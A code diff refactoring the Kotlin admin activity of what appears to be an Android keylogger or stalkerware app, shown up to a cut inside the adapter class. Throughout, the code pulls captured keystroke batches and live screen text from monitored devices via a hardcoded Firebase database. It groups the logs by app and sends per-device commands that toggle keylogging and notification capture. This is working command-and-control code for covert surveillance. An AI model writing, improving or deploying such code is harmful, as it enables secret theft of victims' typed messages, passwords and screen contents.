@@ -1,11 +1,13 @@
 package com.example.mykeyboardadmin
 
+import android.graphics.Color
 import android.os.Bundle
 import android.view.LayoutInflater
 import android.view.MotionEvent
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
+import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -21,66 +23,70 @@ import java.util.Calendar
 import java.util.Date
 import java.util.Locale
 
+data class DeviceModel(
+    val name: String,
+    var keylogging: Boolean = true,
+    var notifications: Boolean = true,
+    var selectedAppFilter: String? = null,
+    var lastSeenTimestamp: Long = 0L,
+    var liveScreenState: String = "Waiting for live screen broadcast...",
+    var isExpanded: Boolean = false,
+    val rawEntries: MutableList<Triple<Long, String, String>> = mutableListOf()
+) {
+    val logFeed: String
+        get() {
+            val filtered = if (selectedAppFilter != null) {
+                rawEntries.filter { it.second == selectedAppFilter }
+            } else {
+                rawEntries
+            }
+            val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+            val sb = StringBuilder()
+            for (item in filtered) {
+                val dateStr = dateTimeFormat.format(Date(item.first))
+                sb.append("[$dateStr] [${item.second}] ${item.third}\n")
+            }
+            val totalCount = if (selectedAppFilter != null) {
+                rawEntries.count { it.second == selectedAppFilter }
+            } else {
+                rawEntries.size
+            }
+            return if (sb.isNotEmpty()) {
+                "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
+            } else {
+                "No telemetry recorded for ${selectedAppFilter ?: "device"}."
+            }
+        }
+
+    val appsTotalMap: Map<String, Int>
+        get() {
+            val map = mutableMapOf<String, Int>()
+            for (entry in rawEntries) {
+                map[entry.second] = (map[entry.second] ?: 0) + 1
+            }
+            return map
+        }
+}
+
+data class LogEntry(
+    val timestamp: Long,
+    val appName: String,
+    val text: String
+)
+
 class AdminMainActivity : AppCompatActivity() {
 
     private lateinit var recyclerView: RecyclerView
     private lateinit var txtTotalDevices: TextView
     private lateinit var txtTotalEvents: TextView
 
-    private val deviceList = mutableListOf<DeviceModel>()
+    private val masterDeviceList = mutableListOf<DeviceModel>()
+    private val filteredDeviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
 
-    data class DeviceModel(
-        val name: String,
-        var keylogging: Boolean = true,
-        var notifications: Boolean = true,
-        var selectedAppFilter: String? = null,
-        var lastSeenTimestamp: Long = 0L,
-        var liveScreenState: String = "Waiting for live screen broadcast...",
-        var isExpanded: Boolean = false,
-        val rawEntries: MutableList<Triple<Long, String, String>> = mutableListOf()
-    ) {
-        val logFeed: String
-            get() {
-                val filtered = if (selectedAppFilter != null) {
-                    rawEntries.filter { it.second == selectedAppFilter }
-                } else {
-                    rawEntries
-                }
-                val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-                val sb = StringBuilder()
-                for (item in filtered) {
-                    val dateStr = dateTimeFormat.format(Date(item.first))
-                    sb.append("[$dateStr] [${item.second}] ${item.third}\n")
-                }
-                val totalCount = if (selectedAppFilter != null) {
-                    rawEntries.count { it.second == selectedAppFilter }
-                } else {
-                    rawEntries.size
-                }
-                return if (sb.isNotEmpty()) {
-                    "=== ${selectedAppFilter?.uppercase() ?: "ALL APPS"} TELEMETRY (Showing ${filtered.size} of $totalCount total) ===\n\n$sb"
-                } else {
-                    "No telemetry recorded for ${selectedAppFilter ?: "device"}."
-                }
-            }
-
-        val appsTotalMap: Map<String, Int>
-            get() {
-                val map = mutableMapOf<String, Int>()
-                for (entry in rawEntries) {
-                    map[entry.second] = (map[entry.second] ?: 0) + 1
-                }
-                return map
-            }
-    }
-
-    data class LogEntry(
-        val timestamp: Long,
-        val appName: String,
-        val text: String
-    )
+    private var devicesListener: ValueEventListener? = null
+    private var devicesRef: com.google.firebase.database.DatabaseReference? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -102,7 +108,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
-        adapter = DeviceAdapter(deviceList) { device, type, newState ->
+        adapter = DeviceAdapter(masterDeviceList) { device, type, newState ->
             val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
             if (type == "key") {
                 device.keylogging = newState
@@ -121,17 +127,28 @@ class AdminMainActivity : AppCompatActivity() {
         loadConnectedDevices()
     }
 
+    override fun onDestroy() {
+        super.onDestroy()
+        if (devicesListener != null && devicesRef != null) {
+            devicesRef?.removeEventListener(devicesListener!!)
+        }
+    }
+
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
-        dbRef.addValueEventListener(object : ValueEventListener {
+        if (devicesListener != null && devicesRef != null) {
+            devicesRef?.removeEventListener(devicesListener!!)
+        }
+
+        devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        devicesListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val allEntries = mutableListOf<LogEntry>()
 
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
-                    if (deviceList.none { it.name == deviceName }) {
+                    if (masterDeviceList.none { it.name == deviceName }) {
                         val device = DeviceModel(deviceName)
-                        deviceList.add(device)
+                        masterDeviceList.add(device)
                         listenToDeviceState(deviceName)
                         listenToDeviceLogs(deviceName)
                         listenToLiveScreen(deviceName)
@@ -160,23 +177,24 @@ class AdminMainActivity : AppCompatActivity() {
                 cmdRootRef.get().addOnSuccessListener { cmdSnapshot ->
                     for (cmdChild in cmdSnapshot.children) {
                         val deviceName = cmdChild.key ?: continue
-                        if (deviceList.none { it.name == deviceName }) {
+                        if (masterDeviceList.none { it.name == deviceName }) {
                             val device = DeviceModel(deviceName)
-                            deviceList.add(device)
+                            masterDeviceList.add(device)
                             listenToDeviceState(deviceName)
                             listenToDeviceLogs(deviceName)
                             listenToLiveScreen(deviceName)
                         }
                     }
 
-                    txtTotalDevices.text = deviceList.size.toString()
+                    txtTotalDevices.text = masterDeviceList.size.toString()
                     txtTotalEvents.text = allEntries.size.toString()
                     adapter.notifyDataSetChanged()
                 }
             }
 
             override fun onCancelled(error: DatabaseError) {}
-        })
+        }
+        devicesRef?.addValueEventListener(devicesListener!!)
     }
 
     private fun listenToDeviceState(deviceName: String) {
@@ -207,10 +225,10 @@ class AdminMainActivity : AppCompatActivity() {
                     else -> true
                 }
 
-                val index = deviceList.indexOfFirst { it.name == deviceName }
+                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
-                    deviceList[index].keylogging = key
-                    deviceList[index].notifications = notif
+                    masterDeviceList[index].keylogging = key
+                    masterDeviceList[index].notifications = notif
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -227,9 +245,9 @@ class AdminMainActivity : AppCompatActivity() {
                 val pkg = snapshot.child("packageName").getValue(String::class.java) ?: ""
                 val prettyApp = getPrettyAppName(pkg)
 
-                val index = deviceList.indexOfFirst { it.name == deviceName }
+                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1 && !screenText.isNullOrBlank()) {
-                    deviceList[index].liveScreenState = "[$prettyApp] $screenText"
+                    masterDeviceList[index].liveScreenState = "[$prettyApp] $screenText"
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -260,7 +278,6 @@ class AdminMainActivity : AppCompatActivity() {
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
-                val dateTimeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
@@ -284,27 +301,10 @@ class AdminMainActivity : AppCompatActivity() {
                 // Sort newest on top
                 entries.sortByDescending { it.first }
 
-                // Filter for today's logs only and cap to 150 entries for zero lag
-                val calendar = Calendar.getInstance()
-                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
-                val todayYear = calendar.get(Calendar.YEAR)
-
-                val todayEntries = entries.filter { item ->
-                    calendar.timeInMillis = item.first
-                    calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear
-                }
-
-                val sb = StringBuilder()
-                for (item in todayEntries) {
-                    val dateStr = dateTimeFormat.format(Date(item.first))
-                    sb.append("[$dateStr] [${item.second}] ${item.third}\n")
-                }
-
-                val index = deviceList.indexOfFirst { it.name == deviceName }
+                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded today."
-                    deviceList[index].rawEntries.clear()
-                    deviceList[index].rawEntries.addAll(entries)
+                    masterDeviceList[index].rawEntries.clear()
+                    masterDeviceList[index].rawEntries.addAll(entries)
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -319,7 +319,7 @@ class AdminMainActivity : AppCompatActivity() {
     ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {
 
         class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
-            val txtName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
+            val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
             val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
             val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
             val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
